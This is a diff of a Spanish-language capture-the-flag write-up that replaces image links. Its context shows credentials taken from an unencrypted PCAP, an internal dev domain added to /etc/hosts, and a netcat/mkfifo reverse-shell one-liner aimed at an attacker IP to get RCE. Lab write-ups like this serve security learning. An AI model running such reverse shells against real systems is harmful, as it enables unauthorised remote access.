@@ -90,11 +90,11 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 El directorio **/mail/** contenía **conversaciones entre desarrolladores** y un **archivo .pcap**. El .pcap fue la clave para conseguir credenciales en texto claro.
 
-![[pcap_smug.png]]
+<img width="1912" height="838" alt="Image" src="https://github.com/user-attachments/assets/fe1fae5b-a388-4251-b45e-ebfe277b042c" />
 
 Al revisar la captura **PCAP** (posible intercepción de tráfico HTTP sin cifrar), aparecieron credenciales en **texto plano**:
 
-![[captura de paquetes.png]]
+<img width="1918" height="776" alt="Image" src="https://github.com/user-attachments/assets/2d344330-d3c4-4bfa-93b4-964f7f3aef00" />
 
 
 	username: helpdesk
@@ -102,12 +102,12 @@ Al revisar la captura **PCAP** (posible intercepción de tráfico HTTP sin cifra
 
 Además, en los encabezados/flujo HTTP se observó un **dominio interno**: `development.smag.thm`. Para poder resolverlo desde mi equipo, añadí la entrada en `/etc/hosts`:
 
-![[dominio_smug.png]]
+<img width="1918" height="808" alt="Image" src="https://github.com/user-attachments/assets/e3105ab3-f3ca-4f6a-ab7f-6a803cb7dc39" />
 
 Con eso, pude acceder a `http://development.smag.thm/` y llegar a un **panel de login** (`login.php` / `admin.php`), donde funcionaron correctamente las credenciales extraídas del PCAP. **Conclusión**: el equipo filtró credenciales a través de tráfico HTTP sin TLS, y el dominio de desarrollo estaba expuesto y resolvible localmente.
 
 
-![[Pasted image 20250831225215.png]]
+<img width="736" height="367" alt="Image" src="https://github.com/user-attachments/assets/872d2efd-5d49-4a1c-aa2f-87e6e87dca3f" />
 
 ## Ejecución remota de comandos (RCE) y shell inversa
 
@@ -125,7 +125,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.23.120.245 4444 >/tmp/f
 
 y lo ejecutamos.
 
-![[comando_smug.png]]
+<img width="1918" height="554" alt="Image" src="https://github.com/user-attachments/assets/1d62f819-9182-409d-b16a-c29bc6de13bc" />
 
 y listo!!! en nuestra maquina recibiremos una shell
 
